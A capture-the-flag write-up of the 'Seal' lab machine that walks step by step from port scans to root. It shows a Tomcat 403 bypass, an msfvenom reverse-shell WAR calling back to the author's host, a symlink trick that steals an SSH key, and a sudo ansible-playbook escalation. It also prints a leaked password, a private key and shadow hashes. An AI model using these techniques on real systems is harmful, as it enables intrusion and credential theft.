# Seal

# Reconnaissance

First, we start with a full port scan to verify all possible open ports.

```bash
─[us-dedivip-1]─[10.10.16.200]─[jpfguedes@htb]─[~/htb/Seal]
└──╼ [★]$ sudo nmap -v -sS -Pn -p- 10.10.10.250

PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy
```

Running another port scan to verify more detailed information about the host.

```bash
─[us-dedivip-1]─[10.10.16.200]─[jpfguedes@htb]─[~/htb/Seal]                                                                                   
└──╼ [★]$ sudo nmap -vv -A -Pn -p 22,443,8080 10.10.10.250 -oA nmap/seal

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
443/tcp  open  ssl/http   syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=**seal.htb**/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/localityName=Hackney/organiza
tionalUnitName=Infra/emailAddress=admin@**seal.htb**
| Issuer: commonName=**seal.htb**/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/localityName=hackney/organizationalUnitN
ame=Infra/emailAddress=admin@**seal.htb**
8080/tcp open  http-proxy syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 14 Jul 2021 20:34:12 GMT
|     Set-Cookie: JSESSIONID=node05u0o2uxanjshpfsd44nqhz5q2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 14 Jul 2021 20:34:08 GMT
|     Set-Cookie: JSESSIONID=node09i1i41u70c601rtybehb0yggi0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 14 Jul 2021 20:34:10 GMT
|     Set-Cookie: JSESSIONID=node01fpfvx01bcy74lrfgly3k1p9z1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

Acessing the webpage on HTTPS service, we have got

![](images/Untitled.png)

And accessing the HTTP service on port 8080, we have got

![](images/Untitled%201.png)

As we can see, we could retrieve the DNS name on our port scan and we will write it down on our local hosts file

```bash
# Host addresses
127.0.0.1  localhost
127.0.1.1  htb
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters

10.10.10.250    seal.htb
```

Running a brute-force directory on URL ***https://seal.htb***, we were able to retrieve the following

```bash
─[us-dedivip-1]─[10.10.16.200]─[jpfguedes@htb]─[~/htb/Seal]
└──╼ [★]$ cat gobuster/seal_root.out | grep -v '(Status: 400)'
https://seal.htb/images               (Status: 302) [Size: 0] [--> http://seal.htb/images/]
https://seal.htb/css                  (Status: 302) [Size: 0] [--> http://seal.htb/css/]
https://seal.htb/admin                (Status: 302) [Size: 0] [--> http://seal.htb/admin/]
https://seal.htb/js                   (Status: 302) [Size: 0] [--> http://seal.htb/js/]
https://seal.htb/manager              (Status: 302) [Size: 0] [--> http://seal.htb/manager/]
https://seal.htb/icon                 (Status: 302) [Size: 0] [--> http://seal.htb/icon/]
https://seal.htb/host-manager         (Status: 302) [Size: 0] [--> http://seal.htb/host-manager/]
```

Running another brute-force directory on URL ***http://seal.htb:8080***, we have got the following

```bash
─[us-dedivip-1]─[10.10.16.200]─[jpfguedes@htb]─[~/htb/Seal]
└──╼ [★]$ cat gobuster/seal_8080_root.out | grep -v '(Status: 401)'
http://seal.htb:8080/register             (Status: 200) [Size: 8982]
http://seal.htb:8080/assets               (Status: 302) [Size: 0] [--> http://seal.htb:8080/assets/;jsessionid=node01mprhh1lqfnume4ll9t23pyjb1064.node0]
http://seal.htb:8080/signin               (Status: 200) [Size: 6892]
```

After this recon, lets create an account on the GitBucket homepage.

![](images/Untitled%202.png)

After, we login into the GitBucket service and we find some repositories. First, we've looked into the ***infra*** repository.

![](images/Untitled%203.png)

After we have looked into the ***Seal Market*** repository.

![](images/Untitled%204.png)

Looking into some files on these repositories, we could find the tomcat version

![](images/Untitled%205.png)

Searching into the commited files, we were able to get a credential

```bash
<user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
		  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
		  <user username="role1" password="<must-be-changed>" roles="role1"/>
		-->
		<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
		</tomcat-users>
```

| Username | Password | Service |
| --- | --- | --- |
| tomcat | 42MrHBf*z8{Z% | tomcat |
|  |  |  |
|  |  |  |

Looking into nginx configuration files, we could enumerate some possible URLs

![](images/Untitled%206.png)

![](images/Untitled%207.png)

After some researches, we could bypass the 403 forbidden page just passing in URL */manager/status/..;/html* and get the login form to Tomcat

![](images/Untitled%208.png)

With that credential we've found on gitbucket, we could log into the tomcat manager page

![](images/Untitled%209.png)

With that, we generate a payload with msfvenom

```bash
─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
└──╼ [★]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.200 LPORT=443 -f war -o jpfdevs.war
Payload size: 6218 bytes
Final size of war file: 6218 bytes
Saved as: jpfdevs.war
```

For upload our payload, we have to bypass again, the 403 forbidden page

![](images/Untitled%2010.png)

In repeater, we could bypass and upload our malicious war file

![](images/Untitled%2011.png)

![](images/Untitled%2012.png)

Now, accessing our payload

![](images/Untitled%2013.png)

and looking on our netcat listener, we have got a reverse shell

```bash
─[us-dedivip-1]─[10.10.16.200]─[th3g3ntl3m4n@ctf]─[~/htb/images/exploitation]
└──╼ [★]$ nc -vnlp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.250.
Ncat: Connection from 10.10.10.250:32974.
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

Doing more searching we found the *run.yml*  which make backups from webapp ROOT from Tomcat. As we can see, the backup process allows copy links to the .gz file.

```jsx
tomcat@seal:/opt/backups/playbook$ cat run.yml 
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

So lets try to create a symbolic link for id_rsa private key file of luis user in one of the folders that will be executed the backup task

```bash
ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa
```

Now, lets download this backup file to our machine

```bash
tomcat@seal:/tmp$ python3 -m http.server 8008
Serving HTTP on 0.0.0.0 port 8008 (http://0.0.0.0:8008/) ...
10.10.16.200 - - [18/Jul/2021 21:13:14] "GET /backup-2021-07-18-21:10:32.gz HTTP/1.1" 200 -
```

Now, lets rename this file to backupseal.tar.gz and lets extract it

```bash
─[us-vip-20]─[10.10.16.200]─[th3g3ntl3m4n@kali]─[~/htb/images/exploitation]
└──╼ [★]$ mv backup-2021-07-18-21\:10\:32.gz backupseal.tar.gz

─[us-vip-20]─[10.10.16.200]─[th3g3ntl3m4n@kali]─[~/htb/images/exploitation/dashboard/uploads]
└──╼ [★]$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
```

Now, giving 600 permission on id_rsa file, we are able to log into as luis via SSH

```bash
─[us-vip-20]─[10.10.16.200]─[th3g3ntl3m4n@kali]─[~/htb/images/exploitation]
└──╼ [★]$ ssh -i id_rsa luis@seal.htb
The authenticity of host 'seal.htb (10.10.10.250)' can't be established.
ECDSA key fingerprint is SHA256:YTRJC++A+0ww97kJGc5DWAsnI9iusyCE4Nt9fomhxdA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'seal.htb,10.10.10.250' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 18 Jul 2021 09:31:58 PM UTC

  System load:           0.15
  Usage of /:            46.5% of 9.58GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             166
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.250
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c6c6

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri May  7 07:00:18 2021 from 10.10.14.2
luis@seal:~$
```

Now, moving to root privesc, we ran *sudo -l* and we got the following

```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

Searching about that, we've found the path on GTFOBins

```bash
luis@seal:/tmp$ echo '[{hosts: localhost, tasks: [shell: /bin/bash </dev/tty >/dev/tty 2>/dev/tty]}]' > jpfdevs
```

Now executing our jpfdevs file with ansible-playbook binary, we have got root.

```bash
luis@seal:/tmp$ sudo /usr/bin/ansible-playbook jpfdevs
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] *****************************************************************************************************************************

TASK [Gathering Facts] ***********************************************************************************************************************
ok: [localhost]

TASK [shell] *********************************************************************************************************************************
root@seal:/tmp# 
root@seal:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

![](images/Untitled%2014.png)

Catching hashes

```bash
root@seal:~# cat /etc/shadow                                                                                                                  
root:$6$D8b4qJlaLsRsvwuy$qvUFLUdvoH0EsvrLSJCpejOmV7bZoCO2ZGH2ueU77uAHpxepSfK.ts4LkkfwzuJ.IJ87EeK9RrNKHEorKQp3r.
luis:$6$2tGOIZ.O0MqK5nDd$nl12rn9ftZIPGGiFjDKBItGJlKB4uIwsrjVqq6Bkp2C7DVEE9/T4VuZjT1kbZjHCfVgVRGP7sqnSCiu1IRIUZ.
```